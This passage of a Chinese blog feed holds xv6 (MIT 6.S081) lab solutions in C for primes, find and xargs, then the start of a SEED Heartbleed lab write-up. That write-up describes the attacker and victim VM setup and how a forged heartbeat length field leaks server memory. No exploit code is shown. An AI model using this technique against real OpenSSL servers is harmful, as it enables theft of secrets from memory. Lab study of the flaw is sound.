class="hljs-keyword">if</span>(!st[i]) primes[cnt++]=i;<span class="hljs-comment">//æŠŠç´ æ•°å­˜èµ·æ¥</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=i;j&lt;=n;j+=i)&#123;<span class="hljs-comment">//ä¸ç®¡æ˜¯åˆæ•°è¿˜æ˜¯è´¨æ•°ï¼Œéƒ½ç”¨æ¥ç­›æ‰åé¢å®ƒçš„å€æ•°</span><br>            st[j]=<span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_primes1</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)&#123;<br>        <span class="hljs-keyword">if</span>(!st[i])&#123;<br>            primes[cnt++]=i;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=i;j&lt;=n;j+=i) st[j]=<span class="hljs-literal">true</span>;<span class="hljs-comment">//å¯ä»¥ç”¨è´¨æ•°å°±æŠŠæ‰€æœ‰çš„åˆæ•°éƒ½ç­›æ‰ï¼›</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¹¶å‘ç¼–ç¨‹çš„æ€è·¯ä¸åŒäºä»¥ä¸Šæ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥ç»™å‡ºä¼ªä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">p = get a number from left neighbor<br>print p<br>loop:<br>    n = get a number from left neighbor<br>    <span class="hljs-keyword">if</span> (p does <span class="hljs-keyword">not</span> divide n)<br>        send n to right neighbor<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªç”Ÿæˆè¿‡ç¨‹å¯ä»¥å°†æ•°å­—2ã€3ã€4ã€ â€¦ â€¦ 35è¾“å…¥ç®¡é“çš„å·¦ç«¯: ç®¡é“ä¸­çš„ç¬¬ä¸€ä¸ªè¿‡ç¨‹æ¶ˆé™¤äº†2çš„å€æ•°ï¼Œç¬¬äºŒä¸ªè¿‡ç¨‹æ¶ˆé™¤äº†3çš„å€æ•°ï¼Œç¬¬ä¸‰ä¸ªè¿‡ç¨‹æ¶ˆé™¤äº†5çš„å€æ•°ï¼Œä¾æ­¤ç±»æ¨</p><blockquote><p><a href="https://swtch.com/~rsc/thread/">https://swtch.com/~rsc/thread/</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230227125558.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> READ 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WRITE 1</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">foo</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *left_fd)</span></span><br><span class="hljs-function"></span>&#123;<br>    close(left_fd[WRITE]);<br>    <span class="hljs-keyword">int</span> prime,i;<br>    read(left_fd[READ],&amp;prime,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<span class="hljs-comment">//ç¬¬ä¸€ä¸ªæ•°å­—å¿…å®šæ˜¯ç´ æ•°</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prime %d\n&quot;</span>,prime);<span class="hljs-comment">//ç¬¦åˆæ ¼å¼çš„è¾“å‡º</span><br>    <br>    <span class="hljs-keyword">if</span>(read(left_fd[READ],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>))!=<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">int</span> right_fd[<span class="hljs-number">2</span>];<br>        pipe(right_fd);<br>        <span class="hljs-keyword">int</span> pid=fork();<br>        <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)<br>        &#123;<br>            foo(right_fd);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid&gt;<span class="hljs-number">0</span>)<br>        &#123;<br>            close(right_fd[READ]);<br>            <span class="hljs-keyword">if</span>(i%prime!=<span class="hljs-number">0</span>)<span class="hljs-comment">//æ³¨æ„å·²ç»è¯»å–äº†ä¸€ä¸ªiï¼Œè¿™é‡Œè¦åˆ¤æ–­ä¸€ä¸‹</span><br>            &#123;<br>                write(right_fd[WRITE],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>            &#125;<br>            <span class="hljs-keyword">while</span>(read(left_fd[READ],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>))!=<span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(i%prime!=<span class="hljs-number">0</span>)<br>                &#123;<br>                    write(right_fd[WRITE],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>                &#125;<br>            &#125;<br>            close(right_fd[WRITE]);<br>            close(left_fd[READ]);<br>            wait(<span class="hljs-number">0</span>);<span class="hljs-comment">//çˆ¶è¿›ç¨‹è¦ç­‰å¾…å­è¿›ç¨‹</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> * argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> left_fd[<span class="hljs-number">2</span>];<br>    pipe(left_fd);<br>    <br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <br>    <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)<span class="hljs-comment">//child</span><br>    &#123;<br>        foo(left_fd);<br>    &#125; <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid &gt;<span class="hljs-number">0</span>)<br>    &#123;<br>        close(left_fd[READ]);<br>        <span class="hljs-keyword">int</span> i;<br>        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">2</span>;i&lt;=<span class="hljs-number">35</span>;i++)<span class="hljs-comment">//ç¬¬ä¸€è½®ï¼ŒæŠŠ2~35å…¨éƒ½ä¼ é€’ç»™å³è¾¹</span><br>        &#123;<br>            write(left_fd[WRITE],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>        &#125;<br>        close(left_fd[WRITE]);<br>        wait(<span class="hljs-number">0</span>);<span class="hljs-comment">//ä¸»è¦çš„ç´ æ•°è¿›ç¨‹åº”è¯¥åªæœ‰åœ¨æ‰€æœ‰çš„è¾“å‡ºéƒ½æ‰“å°å‡ºæ¥ä¹‹åï¼Œå¹¶ä¸”åœ¨æ‰€æœ‰å…¶ä»–çš„ç´ æ•°è¿›ç¨‹éƒ½é€€å‡ºä¹‹åæ‰èƒ½é€€å‡º</span><br>    &#125;<br>    <br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="find"><a href="#find" class="headerlink" title="find"></a>find</h1><p>Write a simple version of the UNIX find program: find all the files in a directory tree whose name matches a string. Your solution should be in the file <code>user/find.c</code>.</p><ul><li>åŠŸèƒ½ï¼šæŸ¥æ‰¾ç›®å½•æ ‘ä¸­åç§°ä¸å­—ç¬¦ä¸²åŒ¹é…çš„æ‰€æœ‰æ–‡ä»¶</li><li>å¯ä»¥å‚è€ƒuser/ls.c ä»¥äº†è§£å¦‚ä½•è¯»å–ç›®å½•</li><li>é¿å¼€<code>.</code>å’Œ<code>..</code>çš„é€’å½’</li></ul><p>æ€è·¯ï¼š</p><p>æ‰“å¼€ç›®å½•ï¼Œä½¿ç”¨whileå¾ªç¯å¾—åˆ°ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶/å­ç›®å½•çš„direntç»“æ„ä½“de</p><ul><li>å¦‚æœæ˜¯de.nameæ˜¯.æˆ–è€…..ï¼Œé‚£ä¹ˆç›´æ¥continueè·³è¿‡</li><li>å¦‚æœä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥è·å–æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„buf<ul><li>å¦‚æœbufçš„stç±»å‹æ˜¯æ–‡ä»¶ç±»å‹ï¼Œä¸”æ–‡ä»¶åå­—å’Œæˆ‘ä»¬éœ€è¦æœç´¢çš„æ–‡ä»¶åå­—ç›¸åŒï¼Œé‚£ä¹ˆå°±ç›´æ¥è¾“å‡ºæ–‡ä»¶ä¿¡æ¯ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„æ–‡ä»¶</li><li>å¦‚æœbufçš„stç±»å‹æ˜¯ç›®å½•ï¼Œä¸”ä¸ä¸ºç©ºï¼Œé‚£ä¹ˆå°±ç»§ç»­é€’å½’æœç´¢ä¸‹å»</li></ul></li></ul><blockquote><p>æ¶‰åŠåˆ°readã€fstatç­‰å‡½æ•°çš„ä½¿ç”¨</p><p>æ¶‰åŠåˆ°direntã€statç»“æ„ä½“çš„ä½¿ç”¨</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/fs.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * path,<span class="hljs-keyword">char</span> *file)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> <span class="hljs-title">de</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">512</span>], *p;<br><br>    <span class="hljs-keyword">if</span>((fd = open(path, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//æ‰“å¼€ç›®å½•ï¼Œè·å¾—å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦</span><br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;find: cannot open %s\n&quot;</span>, path);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(fstat(fd, &amp;st) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;find: cannot stat %s\n&quot;</span>, path);<br>        close(fd);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">while</span>(read(fd, &amp;de, <span class="hljs-keyword">sizeof</span>(de)) == <span class="hljs-keyword">sizeof</span>(de))<span class="hljs-comment">//ä½¿ç”¨whileå¾ªç¯å¾—åˆ°ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶/å­ç›®å½•çš„direntç»“æ„ä½“de</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(de.name,<span class="hljs-string">&quot;.&quot;</span>)==<span class="hljs-number">0</span>||<span class="hljs-built_in">strcmp</span>(de.name,<span class="hljs-string">&quot;..&quot;</span>)==<span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">continue</span>;<span class="hljs-comment">//è·³è¿‡</span><br>        <br>        <span class="hljs-built_in">strcpy</span>(buf, path);<br>        p = buf+<span class="hljs-built_in">strlen</span>(buf);<br>        *p++ = <span class="hljs-string">&#x27;/&#x27;</span>;<br>        <span class="hljs-keyword">char</span> *pp=de.name;<br>        <span class="hljs-keyword">while</span>(*pp!=<span class="hljs-number">0</span>) <span class="hljs-comment">//å­—ç¬¦ä¸²æ‹¼æ¥</span><br>        &#123;<br>            *p++ =*pp++;<br>        &#125;<br>        *p=<span class="hljs-number">0</span>;<span class="hljs-comment">//åˆ«å¿˜äº†åŠ ç»ˆæ­¢ç¬¦</span><br>        <br>        <span class="hljs-keyword">if</span>(stat(buf, &amp;st) &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">//è·å–bufçš„st</span><br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;find: cannot stat %s\n&quot;</span>, buf);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(st.type==T_FILE)<span class="hljs-comment">//å¦‚æœbufçš„stç±»å‹æ˜¯æ–‡ä»¶ç±»å‹</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(de.name,file)==<span class="hljs-number">0</span>)<span class="hljs-comment">//å¦‚æœæ–‡ä»¶åå­—å’Œæˆ‘ä»¬éœ€è¦æœç´¢çš„æ–‡ä»¶åå­—ç›¸åŒï¼Œé‚£ä¹ˆå°±ç›´æ¥è¾“å‡ºæ–‡ä»¶ä¿¡æ¯</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,buf);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(st.type==T_DIR)<span class="hljs-comment">//å¦‚æœbufçš„stç±»å‹æ˜¯ç›®å½•ç±»å‹</span><br>        &#123;<br>            <span class="hljs-keyword">if</span> (de.inum == <span class="hljs-number">0</span>) <span class="hljs-comment">//ç›®å½•ä¸‹æ²¡æœ‰æ–‡ä»¶ï¼Œå¦‚æœç¼ºå°‘è¿™ä¸ªè¯­å¥xargså‘½ä»¤å°†ä¼šæŠ¥é”™</span><br>    <span class="hljs-keyword">continue</span>;<br>            find(buf,file);<span class="hljs-comment">//é€’å½’ï¼Œç»§ç»­æœç´¢</span><br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> * path=argv[<span class="hljs-number">1</span>];<span class="hljs-comment">//æŸ¥æ‰¾ç›®å½•</span><br>    <span class="hljs-keyword">char</span> * file=argv[<span class="hljs-number">2</span>];<span class="hljs-comment">//æŸ¥æ‰¾æ–‡ä»¶</span><br><br>    find(path,file);<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h1><p>Write a simple version of the UNIX xargs program: read lines from the standard input and run a command for each line, supplying the line as arguments to the command. Your solution should be in the file <code>user/xargs.c</code>.</p><ul><li>å¯¹äºç®¡é“è¿æ¥çš„å‘½ä»¤ï¼Œä»¥<code>find . b | xargs grep hello</code>ä¸ºä¾‹ï¼Œargv[0]æ˜¯ xargsï¼Œargv[1]æ˜¯grepï¼Œä¸€å…±æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œå¦‚æœæƒ³è¦è¯»å–find . bï¼Œé‚£ä¹ˆéœ€è¦ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–ï¼Œä¹Ÿå³æ˜¯ä½¿ç”¨readå‡½æ•°è¯»å–fdä¸º0æ—¶çš„æ•°æ®</li><li>æ¯ä¸€æ¬¡è¯»å–ä¸€è¡Œï¼Œå°†è¯¥è¡Œæ‰€æœ‰ç©ºæ ¼æ›¿æ¢ä¸º\0ï¼Œè¿™æ ·å‘½ä»¤å°±å¯ä»¥è¢«åˆ†å‰²ã€‚ç„¶åå°†argv[]æŒ‡å‘è¿™äº›å‘½ä»¤ã€‚å¦‚æœé‡åˆ°æ¢è¡Œç¬¦ï¼Œæ‰§è¡Œforkï¼Œçˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹ç»“æŸ</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/fs.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/param.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDIN 0</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1024</span>];<br>    <span class="hljs-keyword">char</span> c;<br>    <span class="hljs-keyword">char</span> *Argv[MAXARG];<br>    <span class="hljs-keyword">int</span> index=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;=argc<span class="hljs-number">-1</span>;i++)<br>    &#123;<br>        Argv[i<span class="hljs-number">-1</span>]=argv[i];<span class="hljs-comment">//ignore xargs(argv[0])</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>    &#123;<br>        index=<span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(buf));<br>        <span class="hljs-keyword">char</span> *p=buf;<br>        i=argc<span class="hljs-number">-1</span>;<span class="hljs-comment">//æ³¨æ„iè¦å†™åœ¨è¿™é‡Œ</span><br>        <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>        &#123;<br>            <span class="hljs-keyword">int</span> num=read(STDIN,&amp;c,<span class="hljs-number">1</span>);<span class="hljs-comment">//è¯»å–æ ‡å‡†è¾“å…¥,æ³¨æ„æ˜¯&amp;c</span><br>            <span class="hljs-keyword">if</span>(num!=<span class="hljs-number">1</span>)<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">//ç¨‹åºçš„ç»ˆæ­¢æ¡ä»¶</span><br>            <span class="hljs-keyword">if</span>(c==<span class="hljs-string">&#x27; &#x27;</span>||c==<span class="hljs-string">&#x27;\n&#x27;</span>)<br>            &#123;<br>                buf[index++]=<span class="hljs-string">&#x27;\0&#x27;</span>;<br>                Argv[i++]=p;<span class="hljs-comment">//å‚æ•°</span><br>                p=&amp;buf[index];<span class="hljs-comment">//æ›´æ–°å‚æ•°é¦–åœ°å€</span><br>                <span class="hljs-keyword">if</span>(c==<span class="hljs-string">&#x27;\n&#x27;</span>) <br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-comment">//character </span><br>            &#123;<br>                buf[index++]=c;<br>            &#125;<br>        &#125;<br>        Argv[i]=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> pid = fork();<br>        <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)<br>        &#123;<br>            exec(Argv[<span class="hljs-number">0</span>],Argv);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            wait(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230301002218.png"></p>]]></content>
    
    
    <categories>
      
      <category>MIT6S081</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-labï¼šHeartbleed Attack Lab</title>
    <link href="/p/cd441a20/"/>
    <url>/p/cd441a20/</url>
    
    <content type="html"><![CDATA[<h1 id="å®éªŒå‡†å¤‡"><a href="#å®éªŒå‡†å¤‡" class="headerlink" title="å®éªŒå‡†å¤‡"></a>å®éªŒå‡†å¤‡</h1><p>è®¾ç½®ä¸¤ä¸ª VM: </p><ul><li>æ”»å‡»è€…æœºå™¨<ul><li>ä¿®æ”¹/etc/hosts æ–‡ä»¶å°†æœåŠ¡å™¨åæ˜ å°„åˆ°æœåŠ¡å™¨ VM çš„ IP åœ°å€ï¼Œåœ¨/etc/hosts ä¸­æœç´¢<code>127.0.0.1   www.heartbleedlabelgg.com</code>ï¼Œå°†æ‰¿è½½ELGGåº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨VMçš„å®é™…IPåœ°å€æ›¿æ¢æ‰127.0.0.1</li></ul></li><li>å—å®³è€…æœåŠ¡å™¨</li></ul><h1 id="Heartbleedæ¼æ´åˆ†æ"><a href="#Heartbleedæ¼æ´åˆ†æ" class="headerlink" title="Heartbleedæ¼æ´åˆ†æ"></a>Heartbleedæ¼æ´åˆ†æ</h1><p>OpenSSL åº“ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå—å½±å“çš„ OpenSSL ç‰ˆæœ¬èŒƒå›´ä»1.0.1åˆ°1.0.1 fï¼Œåœ¨ä¸€äº›æ–°ç‰ˆæœ¬çš„OpenSSLä¸­æ— æ³•å¤ç°</p><p>å¿ƒè·³åè®®æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚å¿ƒè·³åè®®ç”±ä¸¤ç§æ¶ˆæ¯ç±»å‹ç»„æˆ: HeartbeatRequest åŒ…å’Œ HeartbeatResponse åŒ…ã€‚å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ª HeartbeatRequest æ•°æ®åŒ…ã€‚å½“æœåŠ¡å™¨æ¥æ”¶åˆ°å®ƒæ—¶ï¼Œå®ƒä¼šå‘å› HeartbeatResponse æ•°æ®åŒ…ä¸­æ¥æ”¶åˆ°çš„æ¶ˆæ¯çš„å‰¯æœ¬ã€‚ç›®æ ‡æ˜¯ä¿æŒè¿æ¥æ´»è·ƒ</p><p>å¿ƒè„å‡ºè¡€æ”»å‡»æ˜¯åŸºäºå¿ƒè·³è¯·æ±‚çš„ã€‚è¿™ä¸ªè¯·æ±‚åªæ˜¯å‘æœåŠ¡å™¨å‘é€ä¸€äº›æ•°æ®ï¼ŒæœåŠ¡å™¨å°†æŠŠè¿™äº›æ•°æ®å¤åˆ¶åˆ°å®ƒçš„å“åº”æ•°æ®åŒ…ä¸­ï¼Œè¿™æ ·æ‰€æœ‰çš„æ•°æ®éƒ½ä¼šå¾—åˆ°å›æ˜¾</p><p><strong>åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œå‡è®¾è¯·æ±‚åŒ…å«3ä¸ªå­—èŠ‚çš„æ•°æ®â€œ ABCâ€ï¼Œå› æ­¤é•¿åº¦å­—æ®µçš„å€¼ä¸º3ã€‚æœåŠ¡å™¨å°†æŠŠæ•°æ®æ”¾åœ¨å†…å­˜ä¸­ï¼Œå¹¶ä»æ•°æ®çš„å¼€å¤´å¤åˆ¶3ä¸ªå­—èŠ‚åˆ°å®ƒçš„å“åº”æ•°æ®åŒ…ã€‚åœ¨æ”»å‡»åœºæ™¯ä¸­ï¼Œè¯·æ±‚å¯èƒ½åŒ…å«3ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œä½†é•¿åº¦å­—æ®µå¯èƒ½æ˜¯1003ã€‚å½“æœåŠ¡å™¨æ„é€ å®ƒçš„å“åº”æ•°æ®åŒ…æ—¶ï¼Œå®ƒä»æ•°æ®çš„å¼€å§‹è¿›è¡Œå¤åˆ¶(å³â€œ ABCâ€) ï¼Œä½†æ˜¯å®ƒå¤åˆ¶çš„æ˜¯1003ä¸ªå­—èŠ‚ï¼Œè€Œä¸æ˜¯3ä¸ªå­—èŠ‚ã€‚è¿™é¢å¤–çš„1000ç§ç±»å‹æ˜¾ç„¶ä¸æ˜¯æ¥è‡ªè¯·æ±‚æ•°æ®åŒ…; 